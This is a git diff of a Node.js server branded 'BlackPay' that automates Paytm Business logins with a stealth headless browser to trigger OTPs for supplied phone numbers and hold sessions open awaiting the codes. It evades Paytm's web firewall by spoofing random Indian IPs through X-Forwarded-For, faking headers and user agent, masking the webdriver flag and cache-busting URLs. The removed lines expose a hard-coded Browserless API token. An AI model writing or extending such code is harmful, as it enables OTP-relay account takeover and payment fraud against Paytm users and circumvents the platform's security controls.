@@ -2,7 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
 
-// Puppeteer with Stealth Plugin for Browserless
+// Puppeteer with Stealth Plugin
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
@@ -14,7 +14,7 @@ app.use(cors());
 
 let activeSessions = {};
 
-app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running with Browserless.io!" }));
+app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running on RENDER (In-House)!" }));
 
 // Dummy Uono Hub Routes
 app.get('/next/micro/ar/all-customers', (req, res) => res.json({ success: true, data: [] }));
@@ -24,33 +24,37 @@ app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pend
 app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));
 
 // ==========================================
-// STEP 1: TRIGGER OTP VIA BROWSERLESS (ULTRA STEALTH + HAIL MARY BYPASS)
+// STEP 1: TRIGGER OTP VIA RENDER ITSELF (NO BROWSERLESS)
 // ==========================================
 app.post('/api/start-tool', async (req, res) => {
     const { phone, walletType } = req.body;
     if (!phone) return res.status(400).json({ success: false, message: "Phone required" });
-
-    // 🔴 BROWSERLESS KA ASLI JUGAAD (Stealth + Headless False + Webdriver Disable) 🔴
-    const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true&headless=false&--disable-blink-features=AutomationControlled';
 
     if (activeSessions[phone] && activeSessions[phone].browser) {
         try { await activeSessions[phone].browser.close(); } catch(e){}
     }
     
     activeSessions[phone] = { status: 'waiting_for_otp', upiId: null, browser: null, page: null };
-    
-    // 🛑 res.json yahan se hata hua hai (Fake success roke)
 
     try {
-        console.log(`[+] Connecting to Browserless.io for: ${phone}`);
+        console.log(`[+] Launching Chrome directly inside Render for: ${phone}`);
         
-        const browser = await puppeteer.connect({ 
-            browserWSEndpoint: browserWSEndpoint,
-            defaultViewport: null
+        // 🔥 NAYA MAJDUR: RENDER KE ANDAR ASLI CHROME 🔥
+        const browser = await puppeteer.launch({ 
+            headless: true, // Render cloud par screen nahi hoti
+            args: [
+                '--no-sandbox', 
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage', // RAM bachane ke liye
+                '--disable-gpu',
+                '--no-first-run',
+                '--no-zygote',
+                '--single-process',
+                '--disable-blink-features=AutomationControlled'
+            ]
         });
 
         const page = await browser.newPage();
-        
         activeSessions[phone].browser = browser;
         activeSessions[phone].page = page;
 
@@ -71,12 +75,11 @@ app.post('/api/start-tool', async (req, res) => {
             await page.keyboard.press('Enter');
 
         } else {
-            console.log(`[!] Opening Paytm Business (HAIL MARY BYPASS) for ${phone}...`);
+            console.log(`[!] Opening Paytm Business (Render IP Bypass) for ${phone}...`);
             
-            // 🔥 TRICK 1: Jio ka ek Random Indian IP generate karna
+            // 🔥 TRICK: Fake Indian IP aur Headers wahi rahenge
             const randomIP = `49.36.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; 
 
-            // 🔥 TRICK 2: Paytm ke Firewall ko Fake IP aur Fake Headers bhejna
             await page.setExtraHTTPHeaders({
                 'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8,hi;q=0.7',
                 'X-Forwarded-For': randomIP,
@@ -91,15 +94,12 @@ app.post('/api/start-tool', async (req, res) => {
                 'Upgrade-Insecure-Requests': '1'
             });
 
-            // 🔥 TRICK 3: Mobile ki jagah Desktop ban ke jayenge taaki WAF block na kare
             await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36');
 
-            // Webdriver trace mitana
             await page.evaluateOnNewDocument(() => {
                 Object.defineProperty(navigator, 'webdriver', { get: () => false });
             });
 
-            // 🔥 TRICK 4: Cache Buster URL (Naya link taaki purani block IP yaad na rakhe)
             const cacheBuster = Date.now();
             const spoofedUrl = `https://dashboard.paytm.com/login/?ref=app&_t=${cacheBuster}`;
             
@@ -108,13 +108,13 @@ app.post('/api/start-tool', async (req, res) => {
 
             let pageText = await page.evaluate(() => document.body.innerText);
             if (pageText.toLowerCase().includes('server busy') || pageText.toLowerCase().includes('something went wrong')) {
-                console.log(`[!] BLOCKED AGAIN: WAF ne IP pakad li.`);
+                console.log(`[!] RENDER IP BLOCKED: WAF ne IP pakad li.`);
                 throw new Error("Paytm Firewall Block (Server Busy)");
             }
 
             let inputField = await page.waitForSelector('input[type="tel"], input[name="mobileNumber"]', { timeout: 15000 });
             await inputField.focus(); 
-            await inputField.type(phone, { delay: 200 }); // Ekdum dheere type karna
+            await inputField.type(phone, { delay: 200 }); 
 
             await page.evaluate(() => {
                 const btns = Array.from(document.querySelectorAll('button'));
@@ -124,9 +124,9 @@ app.post('/api/start-tool', async (req, res) => {
             await page.keyboard.press('Enter');
         }
         
-        console.log(`[!] OTP Triggered on Browserless for ${phone}`);
+        console.log(`[!] OTP Triggered on Render Majdur for ${phone}`);
 
-        // 🔥 FIX: Asli success response
+        // Fake success hat gaya, ab tabhi message jayega jab OTP sach mein bhej dega
         res.json({ success: true, message: "OTP sent! Waiting for input..." });
 
         setTimeout(async () => {
@@ -137,7 +137,7 @@ app.post('/api/start-tool', async (req, res) => {
         }, 180000);
 
     } catch (e) {
-        console.log(`[-] Browserless Error on ${phone}: ${e.message}`);
+        console.log(`[-] Render Error on ${phone}: ${e.message}`);
         if(activeSessions[phone]) {
             activeSessions[phone].status = 'failed';
             if (activeSessions[phone].browser) {
